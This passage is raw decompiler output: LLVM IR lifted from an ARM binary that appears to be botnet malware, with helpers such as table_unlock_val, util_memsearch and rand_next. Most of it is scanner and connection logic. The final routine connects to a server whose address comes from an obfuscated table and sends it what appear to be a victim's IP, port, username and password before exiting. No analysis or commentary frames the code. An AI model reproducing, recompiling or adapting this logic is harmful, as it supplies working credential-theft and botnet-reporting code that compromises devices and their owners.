  store i32 %v0_11694, i32* %r0.global-to-local, align 4
  %v7_11698 = icmp eq i32 %v0_11694, -1
  %.432 = zext i1 %v7_11698 to i32
  store i32 %.432, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_116a4 = icmp eq i32 %v0_11694, 0
  store i1 %v2_116a4, i1* %cpsr_z.global-to-local, align 1
  %tmp424 = icmp slt i32 %v0_11694, 1
  br i1 %tmp424, label %bb425, label %.thread121

.thread121:                                       ; preds = %dec_label_pc_1167c
  store i32 1, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_116b8

bb425:                                            ; preds = %dec_label_pc_1167c
  store i32 %.432, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_116b0 = icmp eq i1 %v7_11698, false
  store i1 %v2_116b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_116b0, label %dec_label_pc_1189c, label %dec_label_pc_116b8

dec_label_pc_116b8:                               ; preds = %.thread121, %bb425
  %v0_116b8 = load i32, i32* @r5, align 4
  %v1_116b8 = add i32 %v0_116b8, 4
  %v2_116b8 = inttoptr i32 %v1_116b8 to i32*
  %v3_116b8 = load i32, i32* %v2_116b8, align 4
  store i32 %v3_116b8, i32* %r0.global-to-local, align 4
  %v1_116bc = call i32 @__GI___libc_close(i32 %v3_116b8)
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_116c4 = load i32, i32* @r4, align 4
  %v1_116c4 = load i32, i32* @r5, align 4
  %v2_116c4 = add i32 %v1_116c4, 4
  %v3_116c4 = inttoptr i32 %v2_116c4 to i32*
  store i32 %v0_116c4, i32* %v3_116c4, align 4
  %v0_116c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_116c8 = load i32, i32* @r5, align 4
  %v2_116c8 = add i32 %v1_116c8, 12
  %v3_116c8 = inttoptr i32 %v2_116c8 to i32*
  store i32 %v0_116c8, i32* %v3_116c8, align 4
  br label %dec_label_pc_11498

dec_label_pc_116d0:                               ; preds = %dec_label_pc_115b4
  store i32 %v2_11578, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_116dc = add i32 %v0_115a0, 4
  %v2_116dc = inttoptr i32 %v1_116dc to i32*
  %v3_116dc = load i32, i32* %v2_116dc, align 4
  store i32 %v3_116dc, i32* %r0.global-to-local, align 4
  %v4_116e0 = call i32 @__libc_send(i32 %v3_116dc, i32 %v2_11578, i32 3, i32 16384)
  store i32 %v4_116e0, i32* %r0.global-to-local, align 4
  store i32 %v2_1158c, i32* %r1.global-to-local, align 4
  %v0_116e8 = load i32, i32* @r5, align 4
  %v1_116e8 = add i32 %v0_116e8, 4
  %v2_116e8 = inttoptr i32 %v1_116e8 to i32*
  %v3_116e8 = load i32, i32* %v2_116e8, align 4
  store i32 %v3_116e8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11548

dec_label_pc_116f8:                               ; preds = %dec_label_pc_10cd8
  store i32 %.pre, i32* @r0, align 4
  %v1_11700 = add i32 %v0_116f8, 92
  store i32 %v1_11700, i32* @r1, align 4
  store i32 192, i32* @r2, align 4
  %v3_11708 = call i32 @memmove(i32 %.pre, i32 %v1_11700, i32 192)
  store i32 %v3_11708, i32* %r0.global-to-local, align 4
  %v0_1170c = load i32, i32* @r5, align 4
  %v1_1170c = add i32 %v0_1170c, 24
  %v2_1170c = inttoptr i32 %v1_1170c to i32*
  %v3_1170c = load i32, i32* %v2_1170c, align 4
  %v1_11710 = add i32 %v3_1170c, -64
  store i32 %v1_11710, i32* %r3.global-to-local, align 4
  store i32 %v1_11710, i32* %v2_1170c, align 4
  br label %dec_label_pc_10ce8

dec_label_pc_1171c:                               ; preds = %dec_label_pc_10e2c
  %v0_1171c = load i32, i32* @r5, align 4
  store i32 %v0_1171c, i32* @r0, align 4
  %v0_11720 = call i32 @setup_connection()
  store i32 %v0_11720, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10e68

dec_label_pc_11728:                               ; preds = %dec_label_pc_11334
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v3_11728 = load i8, i8* %stack_var_-56, align 1
  %v4_11728 = sext i8 %v3_11728 to i32
  %v0_1172c = load i32, i32* @r6, align 4
  store i32 %v0_1172c, i32* %r2.global-to-local, align 4
  %v1_11730 = add nsw i32 %v4_11728, -1
  store i32 %v1_11730, i32* %r3.global-to-local, align 4
  %v0_11734 = load i32, i32* @sl, align 4
  store i32 %v0_11734, i32* %r0.global-to-local, align 4
  %v0_11738 = load i32, i32* @r5, align 4
  %v1_11738 = add i32 %v0_11738, 24
  %v2_11738 = inttoptr i32 %v1_11738 to i32*
  %v3_11738 = load i32, i32* %v2_11738, align 4
  store i32 %v3_11738, i32* %r1.global-to-local, align 4
  %v4_1173c = call i32 @util_memsearch(i32 %v0_11734, i32 %v3_11738, i32 %v0_1172c, i32 %v1_11730)
  store i32 %v4_1173c, i32* %r0.global-to-local, align 4
  %v1_11740 = add i32 %v4_1173c, 1
  store i32 %v1_11740, i32* @r7, align 4
  %v2_11740 = icmp eq i32 %v4_1173c, -1
  store i1 %v2_11740, i1* %cpsr_c.global-to-local, align 1
  %v7_11740 = icmp eq i32 %v1_11740, 0
  store i1 %v7_11740, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11740, label %dec_label_pc_11750, label %dec_label_pc_11394

dec_label_pc_11750:                               ; preds = %dec_label_pc_11728
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_11754 = call i32 @table_lock_val(i32 30)
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_1175c = call i32 @table_lock_val(i32 31)
  store i32 %v1_1175c, i32* %r0.global-to-local, align 4
  %v0_11760 = load i32, i32* @r5, align 4
  %v1_11760 = add i32 %v0_11760, 12
  %v2_11760 = inttoptr i32 %v1_11760 to i32*
  %v3_11760 = load i32, i32* %v2_11760, align 4
  store i32 %v3_11760, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10cd0.backedge

dec_label_pc_10cd0.backedge.thread:               ; preds = %dec_label_pc_10e94, %dec_label_pc_10f68, %dec_label_pc_1103c, %dec_label_pc_11110, %dec_label_pc_111e4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10cd8

dec_label_pc_10cd0.backedge.thread528:            ; preds = %dec_label_pc_11248, %dec_label_pc_110a0, %dec_label_pc_10fcc, %dec_label_pc_11174, %dec_label_pc_10ef8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10cd8

dec_label_pc_10cd0.backedge:                      ; preds = %dec_label_pc_10d4c, %dec_label_pc_11750, %dec_label_pc_11854
  %v0_10cd8186 = phi i32 [ %v0_1185c, %dec_label_pc_11854 ], [ %v0_11760, %dec_label_pc_11750 ], [ %v0_10d4c, %dec_label_pc_10d4c ]
  %v0_10cd0.be = phi i32 [ %v3_1185c, %dec_label_pc_11854 ], [ %v3_11760, %dec_label_pc_11750 ], [ %v3_10d4c, %dec_label_pc_10d4c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10cd0 = icmp eq i32 %v0_10cd0.be, 0
  store i1 %v2_10cd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10cd0, label %dec_label_pc_10dd8, label %dec_label_pc_10cd8

dec_label_pc_11768:                               ; preds = %dec_label_pc_10c88
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 %v2_1135c, i32* %r3.global-to-local, align 4
  store i32 %v2_11348, i32* @lr, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r1, align 4
  store i8 0, i8* %stack_var_-56, align 1
  store i32 4, i32* %stack_var_-60, align 4
  %v5_11794 = call i32 @getsockopt(i32 %v3_10c7c, i32 1, i32 4, i32 %v2_1135c, i32 %v2_11348)
  %v3_11798 = load i8, i8* %stack_var_-56, align 1
  %v4_11798 = sext i8 %v3_11798 to i32
  store i32 %v4_11798, i32* %r3.global-to-local, align 4
  %v2_1179c = or i32 %v4_11798, %v5_11794
  store i32 %v2_1179c, i32* %r0.global-to-local, align 4
  %v4_1179c = icmp eq i32 %v2_1179c, 0
  store i1 %v4_1179c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_1179c, label %dec_label_pc_117a4, label %dec_label_pc_11838

dec_label_pc_117a4:                               ; preds = %dec_label_pc_11768
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_117a8 = load i32, i32* @r5, align 4
  %v2_117a8 = add i32 %v1_117a8, 12
  %v3_117a8 = inttoptr i32 %v2_117a8 to i32*
  store i32 2, i32* %v3_117a8, align 4
  %v0_117ac = call i32 @rand_next()
  %v2_117b4 = load i16, i16* bitcast (i16** @global_var_24698.169 to i16*), align 4
  %v3_117b4 = zext i16 %v2_117b4 to i32
  %v2_117b8 = udiv i32 %v0_117ac, %v3_117b4
  %v3_117b8 = urem i32 %v0_117ac, %v3_117b4
  store i32 %v2_117b8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24668.165 to i32), i32* %r3.global-to-local, align 4
  %v2_117c0 = load i32, i32* @global_var_24668.165, align 4
  store i32 %v2_117c0, i32* %ip.global-to-local, align 4
  %v1_117c8 = load i32, i32* @r4, align 4
  %v9_117c8 = icmp eq i32 %v2_117c0, %v1_117c8
  store i1 %v9_117c8, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_117b8, i32* %r1.global-to-local, align 4
  %v7_117d0 = icmp sgt i32 %v2_117c0, %v1_117c8
  br i1 %v7_117d0, label %dec_label_pc_117d4, label %dec_label_pc_11814

dec_label_pc_117d4:                               ; preds = %dec_label_pc_117a4
  %v2_117d8 = load i32, i32* @global_var_24694.167, align 4
  store i32 %v2_117d8, i32* %r3.global-to-local, align 4
  store i32 %v1_117c8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_117f4

dec_label_pc_117e4:                               ; preds = %dec_label_pc_11804, %dec_label_pc_117f4
  %v1_117e4 = add i32 %v0_117e4, 1
  store i32 %v1_117e4, i32* %r2.global-to-local, align 4
  %v9_117e8 = icmp eq i32 %v1_117e4, %v2_117c0
  %v1_117ec = add i32 %v0_117ec, 16
  store i32 %v1_117ec, i32* %r3.global-to-local, align 4
  br i1 %v9_117e8, label %dec_label_pc_11814.loopexit, label %dec_label_pc_117f4

dec_label_pc_117f4:                               ; preds = %dec_label_pc_117e4, %dec_label_pc_117d4
  %v0_117e4 = phi i32 [ %v1_117e4, %dec_label_pc_117e4 ], [ %v1_117c8, %dec_label_pc_117d4 ]
  %v0_117ec = phi i32 [ %v1_117ec, %dec_label_pc_117e4 ], [ %v2_117d8, %dec_label_pc_117d4 ]
  store i32 %v0_117ec, i32* %r0.global-to-local, align 4
  %v1_117f8 = add i32 %v0_117ec, 8
  %v2_117f8 = inttoptr i32 %v1_117f8 to i16*
  %v3_117f8 = load i16, i16* %v2_117f8, align 2
  %v4_117f8 = zext i16 %v3_117f8 to i32
  store i32 %v4_117f8, i32* %r3.global-to-local, align 4
  %tmp426 = icmp ugt i32 %v4_117f8, %v3_117b8
  br i1 %tmp426, label %dec_label_pc_117e4, label %dec_label_pc_11804

dec_label_pc_11804:                               ; preds = %dec_label_pc_117f4
  %v1_11804 = add i32 %v0_117ec, 10
  %v2_11804 = inttoptr i32 %v1_11804 to i16*
  %v3_11804 = load i16, i16* %v2_11804, align 2
  %v4_11804 = zext i16 %v3_11804 to i32
  store i32 %v4_11804, i32* %r3.global-to-local, align 4
  %v3_11808 = icmp uge i32 %v4_11804, %v3_117b8
  %v9_11808 = icmp eq i32 %v4_11804, %v3_117b8
  %v2_1180c = xor i1 %v3_11808, true
  %v3_1180c = or i1 %v9_11808, %v2_1180c
  br i1 %v3_1180c, label %dec_label_pc_117e4, label %dec_label_pc_11818.loopexit

dec_label_pc_11814.loopexit:                      ; preds = %dec_label_pc_117e4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11814

dec_label_pc_11814:                               ; preds = %dec_label_pc_11814.loopexit, %dec_label_pc_117a4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11818

dec_label_pc_11818.loopexit:                      ; preds = %dec_label_pc_11804
  store i1 %v3_11808, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11818

dec_label_pc_11818:                               ; preds = %dec_label_pc_11818.loopexit, %dec_label_pc_11814
  %v0_1182c = phi i32 [ %v0_117ec, %dec_label_pc_11818.loopexit ], [ 0, %dec_label_pc_11814 ]
  %v0_11818 = load i32, i32* @r5, align 4
  %v1_11818 = add i32 %v0_11818, 4
  %v2_11818 = inttoptr i32 %v1_11818 to i32*
  %v3_11818 = load i32, i32* %v2_11818, align 4
  %v3_1181c = udiv i32 %v3_11818, 32
  store i32 %v3_1181c, i32* %r2.global-to-local, align 4
  %v1_11820 = urem i32 %v3_11818, 32
  store i32 %v1_11820, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_11824 = mul nuw nsw i32 %v3_1181c, 4
  store i32 %v3_11824, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1182c = inttoptr i32 %v0_11818 to i32*
  store i32 %v0_1182c, i32* %v2_1182c, align 4
  %v0_11830 = load i32, i32* %r3.global-to-local, align 4
  %v1_11830 = load i32, i32* @r5, align 4
  %v2_11830 = add i32 %v1_11830, 24
  %v3_11830 = inttoptr i32 %v2_11830 to i32*
  store i32 %v0_11830, i32* %v3_11830, align 4
  %v0_10cb8.pre = load i32, i32* @ip, align 4
  %v1_10cc0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10cb0

dec_label_pc_11838:                               ; preds = %dec_label_pc_11768
  %v0_11838 = load i32, i32* @r5, align 4
  %v1_11838 = add i32 %v0_11838, 4
  %v2_11838 = inttoptr i32 %v1_11838 to i32*
  %v3_11838 = load i32, i32* %v2_11838, align 4
  store i32 %v3_11838, i32* %r0.global-to-local, align 4
  %v1_1183c = call i32 @__GI___libc_close(i32 %v3_11838)
  store i32 %v1_1183c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_11844 = load i32, i32* @r4, align 4
  %v1_11844 = load i32, i32* @r5, align 4
  %v2_11844 = add i32 %v1_11844, 12
  %v3_11844 = inttoptr i32 %v2_11844 to i32*
  store i32 %v0_11844, i32* %v3_11844, align 4
  %v0_11848 = load i32, i32* %r3.global-to-local, align 4
  %v1_11848 = load i32, i32* @r5, align 4
  %v2_11848 = add i32 %v1_11848, 4
  %v3_11848 = inttoptr i32 %v2_11848 to i32*
  store i32 %v0_11848, i32* %v3_11848, align 4
  %v0_1184c = load i32, i32* @r4, align 4
  %v1_1184c = trunc i32 %v0_1184c to i8
  %v2_1184c = load i32, i32* @r5, align 4
  %v3_1184c = add i32 %v2_1184c, 284
  %v4_1184c = inttoptr i32 %v3_1184c to i8*
  store i8 %v1_1184c, i8* %v4_1184c, align 1
  br label %dec_label_pc_10dd8

dec_label_pc_11854:                               ; preds = %thread-pre-split103
  %v1_1185c = add i32 %v0_1185c, 12
  %v2_1185c = inttoptr i32 %v1_1185c to i32*
  %v3_1185c = load i32, i32* %v2_1185c, align 4
  store i32 %v3_1185c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10cd0.backedge

dec_label_pc_1189c:                               ; preds = %bb425
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_118a8 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_118a8, i32* %r0.global-to-local, align 4
  %v2_118ac = icmp eq i32 %v3_118a8, -1
  store i1 %v2_118ac, i1* %cpsr_c.global-to-local, align 1
  %v7_118ac = icmp eq i32 %v3_118a8, -1
  store i1 %v7_118ac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_118a8, i32* @r4, align 4
  br i1 %v7_118ac, label %dec_label_pc_119f8, label %dec_label_pc_118b8

dec_label_pc_118b8:                               ; preds = %dec_label_pc_1189c
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_118bc = call i32 @table_unlock_val(i32 2)
  store i32 2032805430, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i16** @global_var_2716c.115 to i32), i32* %r3.global-to-local, align 4
  %v0_118c8 = load i32, i32* @r6, align 4
  store i32 %v0_118c8, i32* %r1.global-to-local, align 4
  store i32 2032805430, i32* @global_var_27170.117, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_118d4 = inttoptr i32 %v0_118c8 to i32*
  %v3_118d4 = call i32 @table_retrieve_val(i32 2, i32* %v2_118d4)
  store i32 %v2_11684, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_118e8 = call i32 @table_lock_val(i32 2)
  %v0_118ec = load i32, i32* @r4, align 4
  store i32 %v0_118ec, i32* %r0.global-to-local, align 4
  store i32 %v2_11684, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_118f8 = call i32 @__libc_connect(i32 %v0_118ec, i32 %v2_11684, i32 16)
  store i32 %v3_118f8, i32* %r0.global-to-local, align 4
  %v3_118fc = icmp eq i32 %v3_118f8, -1
  store i1 %v3_118fc, i1* %cpsr_c.global-to-local, align 1
  %v8_118fc = icmp eq i32 %v3_118f8, -1
  store i1 %v8_118fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_118fc, label %dec_label_pc_11904, label %dec_label_pc_11954

dec_label_pc_11904:                               ; preds = %dec_label_pc_118b8
  %v0_11904 = load i32, i32* @r4, align 4
  store i32 %v0_11904, i32* %r0.global-to-local, align 4
  %v1_11908 = call i32 @__GI___libc_close(i32 %v0_11904)
  %v0_1190c = load i32, i32* @r6, align 4
  store i32 %v0_1190c, i32* %r0.global-to-local, align 4
  %v1_11910 = call i32 @__GI_exit(i32 %v0_1190c)
  store i32 %v1_11910, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11914

dec_label_pc_11914:                               ; preds = %dec_label_pc_10d84, %dec_label_pc_11904
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_11918 = load i32, i32* @sb, align 4
  %v2_11918 = inttoptr i32 %v1_11918 to i32*
  store i32 104, i32* %v2_11918, align 4
  br label %dec_label_pc_10d9c

dec_label_pc_11920:                               ; preds = %dec_label_pc_10b24
  store i32 %v3_11920, i32* %r0.global-to-local, align 4
  %v3_11928 = udiv i32 %v3_11920, 32
  %v3_1192c = mul nuw nsw i32 %v3_11928, 4
  store i32 %v2_11930, i32* @lr, align 4
  %v2_11934 = add i32 %v3_1192c, %v2_11930
  store i32 %v2_11934, i32* %r3.global-to-local, align 4
  %v1_11938 = add i32 %v2_11934, -312
  %v2_11938 = inttoptr i32 %v1_11938 to i32*
  %v3_11938 = load i32, i32* %v2_11938, align 4
  %v1_1193c = urem i32 %v3_11920, 32
  store i32 %v1_1193c, i32* %r1.global-to-local, align 4
  %v7_11940 = shl i32 1, %v1_1193c
  %v8_11940 = or i32 %v3_11938, %v7_11940
  store i32 %v8_11940, i32* %r2.global-to-local, align 4
  %v0_11944 = load i32, i32* @r5, align 4
  %v3_11944 = icmp uge i32 %v0_11944, %v3_11920
  store i1 %v3_11944, i1* %cpsr_c.global-to-local, align 1
  %v9_11944 = icmp eq i32 %v0_11944, %v3_11920
  store i1 %v9_11944, i1* %cpsr_z.global-to-local, align 1
  %v5_11948 = icmp slt i32 %v0_11944, %v3_11920
  br i1 %v5_11948, label %bb427, label %bb428

bb427:                                            ; preds = %dec_label_pc_11920
  store i32 %v3_11920, i32* @r5, align 4
  br label %bb428

bb428:                                            ; preds = %dec_label_pc_11920, %bb427
  store i32 %v8_11940, i32* %v2_11938, align 4
  br label %bb378

dec_label_pc_11954:                               ; preds = %dec_label_pc_118b8
  store i32 %v2_1135c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11964 = load i32, i32* @r4, align 4
  store i32 %v0_11964, i32* %r0.global-to-local, align 4
  %v0_11968 = load i32, i32* @r6, align 4
  %v6_11968 = trunc i32 %v0_11968 to i8
  store i8 %v6_11968, i8* %stack_var_-56, align 1
  %v6_1196c = call i32 @__libc_send(i32 %v0_11964, i32 %v2_1135c, i32 1, i32 16384)
  store i32 %v2_11348, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11980 = load i32, i32* @r4, align 4
  store i32 %v0_11980, i32* %r0.global-to-local, align 4
  %v4_11984 = call i32 @__libc_send(i32 %v0_11980, i32 %v2_11348, i32 4, i32 16384)
  %v2_1198c = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_1198c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11998 = load i32, i32* @r4, align 4
  store i32 %v0_11998, i32* %r0.global-to-local, align 4
  %v4_1199c = call i32 @__libc_send(i32 %v0_11998, i32 %v2_1198c, i32 2, i32 16384)
  %v0_119a0 = load i32, i32* @r8, align 4
  %v1_119a0 = add i32 %v0_119a0, 12
  store i32 %v1_119a0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_119ac = load i32, i32* @r4, align 4
  store i32 %v0_119ac, i32* %r0.global-to-local, align 4
  %v4_119b0 = call i32 @__libc_send(i32 %v0_119ac, i32 %v1_119a0, i32 1, i32 16384)
  store i32 %v4_119b0, i32* %r0.global-to-local, align 4
  %v0_119b4 = load i32, i32* @r8, align 4
  %v1_119b4 = inttoptr i32 %v0_119b4 to i32*
  %v2_119b4 = load i32, i32* %v1_119b4, align 4
  store i32 %v2_119b4, i32* %r1.global-to-local, align 4
  %v1_119b8 = add i32 %v0_119b4, 12
  %v2_119b8 = inttoptr i32 %v1_119b8 to i8*
  %v3_119b8 = load i8, i8* %v2_119b8, align 1
  %v4_119b8 = zext i8 %v3_119b8 to i32
  store i32 %v4_119b8, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_119c0 = load i32, i32* @r4, align 4
  store i32 %v0_119c0, i32* %r0.global-to-local, align 4
  %v4_119c4 = call i32 @__libc_send(i32 %v0_119c0, i32 %v2_119b4, i32 %v4_119b8, i32 16384)
  %v0_119c8 = load i32, i32* @r8, align 4
  %v1_119c8 = add i32 %v0_119c8, 13
  store i32 %v1_119c8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_119d4 = load i32, i32* @r4, align 4
  store i32 %v0_119d4, i32* %r0.global-to-local, align 4
  %v4_119d8 = call i32 @__libc_send(i32 %v0_119d4, i32 %v1_119c8, i32 1, i32 16384)
  %v0_119dc = load i32, i32* @r4, align 4
  store i32 %v0_119dc, i32* %r0.global-to-local, align 4
  %v0_119e0 = load i32, i32* @r8, align 4
  %v1_119e0 = add i32 %v0_119e0, 13
  %v2_119e0 = inttoptr i32 %v1_119e0 to i8*
  %v3_119e0 = load i8, i8* %v2_119e0, align 1
  %v4_119e0 = zext i8 %v3_119e0 to i32
  store i32 %v4_119e0, i32* %r2.global-to-local, align 4
  %v1_119e4 = add i32 %v0_119e0, 4
  %v2_119e4 = inttoptr i32 %v1_119e4 to i32*
  %v3_119e4 = load i32, i32* %v2_119e4, align 4
  store i32 %v3_119e4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_119ec = call i32 @__libc_send(i32 %v0_119dc, i32 %v3_119e4, i32 %v4_119e0, i32 16384)
  %v0_119f0 = load i32, i32* @r4, align 4
  store i32 %v0_119f0, i32* %r0.global-to-local, align 4
  %v1_119f4 = call i32 @__GI___libc_close(i32 %v0_119f0)
  store i32 %v1_119f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_119f8

dec_label_pc_119f8:                               ; preds = %dec_label_pc_1189c, %dec_label_pc_11954
  %v0_119f8 = load i32, i32* @r6, align 4
  store i32 %v0_119f8, i32* %r0.global-to-local, align 4
  %v1_119fc = call i32 @__GI_exit(i32 %v0_119f8)
  store i32 %v1_119fc, i32* %r0.global-to-local, align 4
  ret i32 %v1_119fc

; uselistorder directives
  uselistorder i32 %v0_11944, { 0, 2, 1 }
  uselistorder i32 %v1_1193c, { 1, 0 }
  uselistorder i1 %v7_118ac, { 1, 0 }
  uselistorder i32 %v3_118a8, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1185c, { 1, 0 }
  uselistorder i32 %v3_11818, { 1, 0 }
  uselistorder i1 %v3_11808, { 1, 0 }
  uselistorder i32 %v0_117ec, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v3_117b8, { 2, 1, 0, 3 }
  uselistorder i32 %v3_117b4, { 1, 0 }
  uselistorder i32 %v0_117ac, { 1, 0 }
  uselistorder i32 %v4_1173c, { 1, 0, 2 }
  uselistorder i32 %v3_116e8, { 1, 0 }
  uselistorder i1 %v2_116b0, { 1, 0 }
  uselistorder i32 %.432, { 1, 0 }
  uselistorder i1 %v7_11698, { 1, 0 }
  uselistorder i32 %v0_11694, { 2, 1, 0, 3 }
  uselistorder i1 %v7_1166c, { 1, 0 }
  uselistorder i32 %v0_1166c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_115f0, { 1, 0 }
  uselistorder i32 %v0_115d4.pr, { 1, 0 }
  uselistorder i32 %v0_115a0, { 1, 2, 0 }
  uselistorder i32 %v0_11564, { 1, 0 }
  uselistorder i32 %v1_1155c, { 1, 0 }
  uselistorder i32 %v1_11554, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_11550, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_11550, { 0, 2, 1 }
  uselistorder i32 %v0_11530.pr, { 1, 0 }
  uselistorder i32 %v0_11510.pr, { 1, 0 }
  uselistorder i1 %v7_114e8, { 1, 0 }
  uselistorder i1 %v2_114d8, { 1, 0, 2 }
  uselistorder i1 %v2_114bc, { 1, 0, 2 }
  uselistorder i32 %v1_114dc, { 1, 2, 3, 0 }
  uselistorder i32 %v1_114b0, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v2_114e0, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_11464, { 1, 0 }
  uselistorder i32 %v0_1185c, { 1, 0, 2 }
  uselistorder i1 %v0_11454, { 1, 0 }
  uselistorder i32 %v4_11448, { 1, 0, 2 }
  uselistorder i32 %v1_11414, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_11414, { 0, 2, 1 }
  uselistorder i32 %v0_1140c, { 1, 0 }
  uselistorder i1 %v7_11408, { 1, 0 }
  uselistorder i1 %v7_11400, { 1, 0 }
  uselistorder i1 %v8_113f8, { 1, 0 }
  uselistorder i1 %v7_113dc, { 1, 0 }
  uselistorder i1 %v7_113d4, { 1, 0 }
  uselistorder i1 %v8_113cc, { 1, 0 }
  uselistorder i32 %v1_113b4, { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i1 %v7_11384, { 1, 0 }
  uselistorder i32 %v1_1132c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_1132c, { 0, 2, 1 }
  uselistorder i32 %v0_11324, { 1, 0 }
  uselistorder i1 %v7_11320, { 1, 0 }
  uselistorder i1 %v7_11318, { 1, 0 }
  uselistorder i1 %v7_11310, { 1, 0 }
  uselistorder i1 %v8_11308, { 1, 0 }
  uselistorder i1 %v7_112ec, { 1, 0 }
  uselistorder i1 %v7_112e4, { 1, 0 }
  uselistorder i1 %v7_112dc, { 1, 0 }
  uselistorder i1 %v8_112d4, { 1, 0 }
  uselistorder i32 %v1_112bc, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_11258, { 1, 0 }
  uselistorder i8 %v3_11250, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_11248, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_11248, { 0, 2, 1 }
  uselistorder i32 %v0_11240, { 1, 0 }
  uselistorder i1 %v7_1123c, { 1, 0 }
  uselistorder i1 %v7_11234, { 1, 0 }
  uselistorder i1 %v7_1122c, { 1, 0 }
  uselistorder i1 %v7_11218, { 1, 0 }
  uselistorder i1 %v7_11210, { 1, 0 }
  uselistorder i1 %v7_11208, { 1, 0 }
  uselistorder i1 %v8_11200, { 1, 0 }
  uselistorder i32 %v1_111e8, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_11184, { 1, 0 }
  uselistorder i8 %v3_1117c, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_11174, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_11174, { 0, 2, 1 }
  uselistorder i32 %v0_1116c, { 1, 0 }
